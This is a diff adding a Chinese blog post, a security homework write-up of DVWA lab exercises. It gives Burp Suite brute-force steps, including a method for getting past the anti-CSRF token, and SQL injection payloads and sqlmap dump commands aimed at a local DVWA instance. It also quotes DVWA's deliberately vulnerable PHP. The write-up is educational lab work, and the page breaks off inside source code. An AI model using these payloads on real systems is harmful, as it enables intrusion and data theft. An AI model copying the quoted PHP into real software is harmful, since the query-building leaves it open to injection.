@@ -1,0 +1,1247 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>网安作业2 - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-12 19:09" pubdate>
+        2020年11月12日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      93
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">网安作业2</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：9 分钟前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="DVWA实验"><a href="#DVWA实验" class="headerlink" title="DVWA实验"></a>DVWA实验</h1><p>一下都是基于low级别的实验，为了方便叙述，提前在数据库中建了一个flag表</p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>使用工具 ：bp</p>
+<p>使用材料：密码字典</p>
+<h3 id="bp的四种爆破攻击类型"><a href="#bp的四种爆破攻击类型" class="headerlink" title="bp的四种爆破攻击类型"></a>bp的四种爆破攻击类型</h3><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
+<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
+<h4 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h4><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
+<h4 id="第四种："><a href="#第四种：" class="headerlink" title="第四种："></a>第四种：</h4><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
+<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password</p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CDesktop%5C%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A%5Cint1.png" srcset="/img/loading.gif" alt="int1"></p>
+<p>2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码</p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CDesktop%5C%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A%5Cint3.png" srcset="/img/loading.gif" alt="int3"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CDesktop%5C%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A%5Cint2.png" srcset="/img/loading.gif" alt="int2"></p>
+<p>3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。</p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CDesktop%5C%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A%5Cint4.png" srcset="/img/loading.gif" alt="int4"></p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Sanitise username input</span>
+    $user = $_GET[ <span class="hljs-string">'username'</span> ];
+    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Sanitise password input</span>
+    $pass = $_GET[ <span class="hljs-string">'password'</span> ];
+    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+    $pass = md5( $pass );
+
+    <span class="hljs-comment">// Check the database</span>
+    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;
+        <span class="hljs-comment">// Get users details</span>
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[<span class="hljs-string">"avatar"</span>];
+
+        <span class="hljs-comment">// Login successful</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;
+    &#125;
+    <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-comment">// Login failed</span>
+        sleep( <span class="hljs-number">2</span> );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<p>与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。</p>
+<p>1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。</p>
+<p>2.加载密码字典进行爆破。</p>
+<p>3.根据响应包的长度确定正确密码。</p>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Check Anti-CSRF token</span>
+    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
+
+    <span class="hljs-comment">// Sanitise username input</span>
+    $user = $_GET[ <span class="hljs-string">'username'</span> ];
+    $user = stripslashes( $user );
+    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+
+    <span class="hljs-comment">// Sanitise password input</span>
+    $pass = $_GET[ <span class="hljs-string">'password'</span> ];
+    $pass = stripslashes( $pass );
+    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
+    $pass = md5( $pass );
+
+    <span class="hljs-comment">// Check database</span>
+    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;
+        <span class="hljs-comment">// Get users details</span>
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[<span class="hljs-string">"avatar"</span>];
+
+        <span class="hljs-comment">// Login successful</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;
+    &#125;
+    <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-comment">// Login failed</span>
+        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);
+&#125;
+
+<span class="hljs-comment">// Generate Anti-CSRF token</span>
+generateSessionToken();
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块</p>
+<p>1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量</p>
+<p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" srcset="/img/loading.gif" alt="intr3-1.png"></p>
+<p>2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</p>
+<p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" srcset="/img/loading.gif" alt="intr3-2.png"></p>
+<p>3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</p>
+<p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" srcset="/img/loading.gif" alt="intr3-3.png"></p>
+<p>4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</p>
+<p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" srcset="/img/loading.gif" alt="intr3-4.png"></p>
+<p>5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。</p>
+<p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" srcset="/img/loading.gif" alt="intr3-5.png"></p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];
+
+    <span class="hljs-comment">// Check database</span>
+    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );
+    <span class="hljs-comment">// Get results</span>
+    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
+        <span class="hljs-comment">// Get values</span>
+        $first = $row[<span class="hljs-string">"first_name"</span>];
+        $last  = $row[<span class="hljs-string">"last_name"</span>];
+
+        <span class="hljs-comment">// Feedback for end user</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>注入点就在这句代码中</p>
+<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h4 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h4><p>1 or 1=1 #</p>
+<p>1’ or 1=1 #</p>
+<p>可知是字符型注入</p>
+<h4 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h4><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre></div>
+
+<p>报错</p>
+<div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre></div>
+
+<p>显示正常，说明只有2个字段</p>
+<h4 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h4><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" srcset="/img/loading.gif" alt="sqll-2.png"></p>
+<p>两个位置都可以使用</p>
+<h4 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h4><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" srcset="/img/loading.gif" alt="sqll-3.png"></p>
+<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-comment">#</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" srcset="/img/loading.gif" alt="sqll-4.png"></p>
+<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" srcset="/img/loading.gif" alt="sqll-1.png"></p>
+<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" srcset="/img/loading.gif" alt="sqll-5.png"></p>
+<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容</p>
+<p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" srcset="/img/loading.gif" alt="sqlm-1.png"></p>
+<h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>经过测试是数字型注入，很简单的判断就不截图了</p>
+<h5 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1.判断列数"></a>1.判断列数</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" srcset="/img/loading.gif" alt="sqlm-2.png"></p>
+<p>此时页面正常</p>
+<div class="hljs"><pre><code class="hljs angelscript">id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre></div>
+
+<p>此时页面报错</p>
+<p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p>
+<p>所以可知为两列，之后的操作与low级别的一样</p>
+<h5 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h5><div class="hljs"><pre><code class="hljs sql">爆数据库名
+id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#&amp;Submit=Submit</span>
+爆列名
+<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x666c6167</span> <span class="hljs-comment">#&amp;Submit=Submit</span>
+
+读取flag
+<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div>
+
+<p>这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 <code>&#39;</code>被 <code>\</code>转义了，可以使用十六进制绕过</p>
+<p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" srcset="/img/loading.gif" alt="sqlm-3.png"></p>
+<p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" srcset="/img/loading.gif" alt="sqlm-4.png"></p>
+<p><strong>分析源码</strong></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $id = $_POST[ <span class="hljs-string">'id'</span> ];
+
+    $id = mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $id);
+
+    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">// Get results</span>
+    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
+        <span class="hljs-comment">// Display values</span>
+        $first = $row[<span class="hljs-string">"first_name"</span>];
+        $last  = $row[<span class="hljs-string">"last_name"</span>];
+
+        <span class="hljs-comment">// Feedback for end user</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
+    &#125;
+
+&#125;
+
+<span class="hljs-comment">// This is used later on in the index.php page</span>
+<span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
+$query  = <span class="hljs-string">"SELECT COUNT(*) FROM users;"</span>;
+$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
+$number_of_rows = mysqli_fetch_row( $result )[<span class="hljs-number">0</span>];
+
